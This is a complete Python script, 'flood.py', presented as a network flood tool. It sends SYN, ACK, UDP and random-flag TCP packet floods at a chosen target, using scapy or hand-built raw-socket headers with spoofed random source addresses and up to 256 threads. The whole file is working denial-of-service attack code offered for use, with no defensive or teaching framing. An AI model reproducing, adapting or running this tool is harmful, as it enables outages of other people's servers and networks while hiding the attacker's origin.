#!/usr/bin/env python3
"""
flood.py — raw socket flood tool (python/scapy version)
supports: SYN, ACK, UDP, TCP-RAW, UDP-RAW
spoofed source IP, multithreaded

usage: python3 flood.py <target_ip> <target_port> <method> [threads] [duration]
methods: syn, ack, udp, tcpraw, udpraw
requires: pip install scapy (or run as root with raw sockets)
"""

import sys
import os
import time
import random
import signal
import threading
from struct import pack, unpack

# ── try scapy first, fallback to raw sockets ────────

USE_SCAPY = False
try:
    from scapy.all import (
        IP, TCP, UDP, Raw, send, RandIP, RandShort, RandInt, conf
    )
    conf.verb = 0  # silence scapy
    USE_SCAPY = True
except ImportError:
    import socket

# ── globals ──────────────────────────────────────────

g_running = True
g_packets = 0
g_lock = threading.Lock()


def rand_ip():
    while True:
        a = random.randint(1, 254)
        if a in (10, 127, 0, 255):
            continue
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def inc_counter():
    global g_packets
    with g_lock:
        g_packets += 1


# ═══════════════════════════════════════════════════
# SCAPY IMPLEMENTATIONS
# ═══════════════════════════════════════════════════

def scapy_syn(target, port):
    global g_running
    while g_running:
        pkt = (
            IP(src=RandIP(), dst=target, ttl=random.randint(64, 128))
            / TCP(sport=RandShort(), dport=port, flags="S",
                  seq=RandInt(), window=65535)
        )
        send(pkt, verbose=0)
        inc_counter()


def scapy_ack(target, port):
    global g_running
    while g_running:
        pkt = (
            IP(src=RandIP(), dst=target, ttl=random.randint(64, 128))
            / TCP(sport=RandShort(), dport=port, flags="A",
                  seq=RandInt(), ack=RandInt(), window=65535)
        )
        send(pkt, verbose=0)
        inc_counter()


def scapy_udp(target, port):
    global g_running
    while g_running:
        payload_len = random.randint(512, 1024)
        payload = bytes(random.getrandbits(8) for _ in range(payload_len))
        pkt = (
            IP(src=RandIP(), dst=target, ttl=random.randint(64, 128))
            / UDP(sport=RandShort(), dport=port)
            / Raw(load=payload)
        )
        send(pkt, verbose=0)
        inc_counter()


def scapy_tcpraw(target, port):
    global g_running
    flags_pool = ["S", "A", "SA", "F", "FA", "R", "RA", "PA", "FPA"]
    while g_running:
        pkt = (
            IP(src=RandIP(), dst=target, ttl=random.randint(64, 128))
            / TCP(sport=RandShort(), dport=port,
                  flags=random.choice(flags_pool),
                  seq=RandInt(), ack=RandInt(),
                  window=random.randint(0, 65535))
        )
        send(pkt, verbose=0)
        inc_counter()


def scapy_udpraw(target, port):
    global g_running
    while g_running:
        payload_len = random.randint(64, 1400)
        payload = os.urandom(payload_len)
        pkt = (
            IP(src=RandIP(), dst=target, ttl=random.randint(64, 128))
            / UDP(sport=RandShort(), dport=port)
            / Raw(load=payload)
        )
        send(pkt, verbose=0)
        inc_counter()


# ═══════════════════════════════════════════════════
# RAW SOCKET IMPLEMENTATIONS (no scapy)
# ═══════════════════════════════════════════════════

def calc_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff


def build_ip_header(src_ip, dst_ip, proto, total_len):
    ihl_ver = (4 << 4) + 5
    ttl = random.randint(64, 128)
    ident = random.randint(0, 65535)

    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    header = pack('!BBHHHBBH4s4s',
                  ihl_ver, 0, total_len, ident, 0,
                  ttl, proto, 0, src, dst)

    csum = calc_checksum(header)
    header = pack('!BBHHHBBH4s4s',
                  ihl_ver, 0, total_len, ident, 0,
                  ttl, proto, csum, src, dst)
    return header


def build_tcp_header(src_ip, dst_ip, sport, dport, seq, ack_seq, flags):
    offset = 5 << 4
    window = 65535
    tcp_header = pack('!HHIIBBHHH',
                      sport, dport, seq, ack_seq,
                      offset, flags, window, 0, 0)

    # pseudo header for checksum
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    tcp_len = len(tcp_header)
    pseudo = pack('!4s4sBBH', src, dst, 0, socket.IPPROTO_TCP, tcp_len)
    csum = calc_checksum(pseudo + tcp_header)

    tcp_header = pack('!HHIIBBHHH',
                      sport, dport, seq, ack_seq,
                      offset, flags, window, csum, 0)
    return tcp_header


def raw_syn(target, port):
    global g_running
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while g_running:
        src = rand_ip()
        sport = random.randint(1024, 65535)

        tcp = build_tcp_header(src, target, sport, port,
                               random.randint(0, 0xFFFFFFFF), 0, 0x02)  # SYN
        ip = build_ip_header(src, target, socket.IPPROTO_TCP, 20 + len(tcp))

        try:
            sock.sendto(ip + tcp, (target, 0))
            inc_counter()
        except Exception:
            pass

    sock.close()


def raw_ack(target, port):
    global g_running
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while g_running:
        src = rand_ip()
        sport = random.randint(1024, 65535)

        tcp = build_tcp_header(src, target, sport, port,
                               random.randint(0, 0xFFFFFFFF),
                               random.randint(0, 0xFFFFFFFF), 0x10)  # ACK
        ip = build_ip_header(src, target, socket.IPPROTO_TCP, 20 + len(tcp))

        try:
            sock.sendto(ip + tcp, (target, 0))
            inc_counter()
        except Exception:
            pass

    sock.close()


def raw_udp(target, port):
    global g_running
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while g_running:
        src = rand_ip()
        sport = random.randint(1024, 65535)
        payload = os.urandom(random.randint(512, 1024))
        udp_len = 8 + len(payload)

        udp_header = pack('!HHHH', sport, port, udp_len, 0)
        ip = build_ip_header(src, target, socket.IPPROTO_UDP, 20 + udp_len)

        try:
            sock.sendto(ip + udp_header + payload, (target, 0))
            inc_counter()
        except Exception:
            pass

    sock.close()


def raw_tcpraw(target, port):
    global g_running
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while g_running:
        src = rand_ip()
        sport = random.randint(1024, 65535)
        flags = random.randint(1, 63)

        tcp = build_tcp_header(src, target, sport, port,
                               random.randint(0, 0xFFFFFFFF),
                               random.randint(0, 0xFFFFFFFF), flags)
        ip = build_ip_header(src, target, socket.IPPROTO_TCP, 20 + len(tcp))

        try:
            sock.sendto(ip + tcp, (target, 0))
            inc_counter()
        except Exception:
            pass

    sock.close()


def raw_udpraw(target, port):
    global g_running
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while g_running:
        src = rand_ip()
        sport = random.randint(0, 65535)
        payload = os.urandom(random.randint(64, 1400))
        udp_len = 8 + len(payload)

        udp_header = pack('!HHHH', sport, port, udp_len, 0)
        ip = build_ip_header(src, target, socket.IPPROTO_UDP, 20 + udp_len)

        try:
            sock.sendto(ip + udp_header + payload, (target, 0))
            inc_counter()
        except Exception:
            pass

    sock.close()


# ═══════════════════════════════════════════════════
# DISPATCHER
# ═══════════════════════════════════════════════════

METHODS_SCAPY = {
    "syn":    scapy_syn,
    "ack":    scapy_ack,
    "udp":    scapy_udp,
    "tcpraw": scapy_tcpraw,
    "udpraw": scapy_udpraw,
}

METHODS_RAW = {
    "syn":    raw_syn,
    "ack":    raw_ack,
    "udp":    raw_udp,
    "tcpraw": raw_tcpraw,
    "udpraw": raw_udpraw,
}


def stats_thread():
    global g_running, g_packets
    last = 0
    while g_running:
        time.sleep(1)
        with g_lock:
            cur = g_packets
        print(f"[*] pps: {cur - last} | total: {cur}")
        last = cur


def sig_handler(sig, frame):
    global g_running
    g_running = False
    print("\n[*] stopping...")


def main():
    if len(sys.argv) < 4:
        print(f"usage: {sys.argv[0]} <target_ip> <port> <method> [threads] [duration]")
        print("methods: syn, ack, udp, tcpraw, udpraw")
        sys.exit(1)

    target   = sys.argv[1]
    port     = int(sys.argv[2])
    method   = sys.argv[3].lower()
    threads  = int(sys.argv[4]) if len(sys.argv) > 4 else 1
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 0

    if threads < 1:
        threads = 1
    if threads > 256:
        threads = 256

    methods = METHODS_SCAPY if USE_SCAPY else METHODS_RAW

    if method not in methods:
        print(f"[!] unknown method: {method}")
        sys.exit(1)

    flood_fn = methods[method]

    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    backend = "scapy" if USE_SCAPY else "raw-socket"
    print(f"[*] backend: {backend}")
    print(f"[*] target: {target}:{port}")
    print(f"[*] method: {method}")
    print(f"[*] threads: {threads}")
    print(f"[*] duration: {'infinite' if duration == 0 else duration}")
    print("[*] launching...")

    # stats
    st = threading.Thread(target=stats_thread, daemon=True)
    st.start()

    # workers
    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_fn, args=(target, port), daemon=True)
        t.start()
        workers.append(t)

    # duration
    if duration > 0:
        time.sleep(duration)
        global g_running
        g_running = False

    for t in workers:
        t.join()

    print(f"[*] done. total packets: {g_packets}")


if __name__ == "__main__":
    main()
